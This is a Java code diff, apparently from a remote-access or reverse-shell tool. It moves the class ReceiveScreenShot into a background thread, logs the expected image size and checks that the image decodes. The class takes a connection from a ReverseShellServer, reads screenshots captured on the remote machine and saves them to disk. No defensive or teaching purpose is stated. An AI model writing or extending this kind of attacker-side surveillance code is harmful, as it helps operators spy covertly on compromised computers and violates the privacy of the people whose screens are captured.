@@ -11,24 +11,31 @@ import javax.imageio.ImageIO;
 public class ReceiveScreenShot {
 
     public void receiveScreenshot() {
-        try {
-            ReverseShellServer server = new ReverseShellServer();
-            Socket clientSocket = server.getClientSocket();
-            DataInputStream dataIn = new DataInputStream(clientSocket.getInputStream());
+        new Thread(() -> {
+            try {
+                ReverseShellServer server = new ReverseShellServer();
+                Socket clientSocket = server.getClientSocket();
+                DataInputStream dataIn = new DataInputStream(clientSocket.getInputStream());
 
-            int fileSize = dataIn.readInt();
-            byte[] imageBytes = new byte[fileSize];
-            dataIn.readFully(imageBytes);
+                int fileSize = dataIn.readInt();
+                System.out.println("[*] Expecting screenshot of size: " + fileSize);
 
-            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(imageBytes);
-            BufferedImage image = ImageIO.read(byteArrayInputStream);
+                byte[] imageBytes = new byte[fileSize];
+                dataIn.readFully(imageBytes);
 
-            File outputFile = new File("screenshot.png");
-            ImageIO.write(image, "png", outputFile);
-            System.out.println("[*] Screenshot received and saved as " + outputFile.getAbsolutePath());
-        } catch (IOException e) {
-            System.err.println("[ERROR] Failed to receive screenshot: " + e.getMessage());
-        }
+                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(imageBytes);
+                BufferedImage image = ImageIO.read(byteArrayInputStream);
+
+                if (image != null) {
+                    File outputFile = new File("screenshot.png");
+                    ImageIO.write(image, "png", outputFile);
+                    System.out.println("[*] Screenshot received and saved as " + outputFile.getAbsolutePath());
+                } else {
+                    System.err.println("[ERROR] Failed to decode the screenshot image.");
+                }
+            } catch (IOException e) {
+                System.err.println("[ERROR] Failed to receive screenshot: " + e.getMessage());
+            }
+        }).start();
     }
-
 }
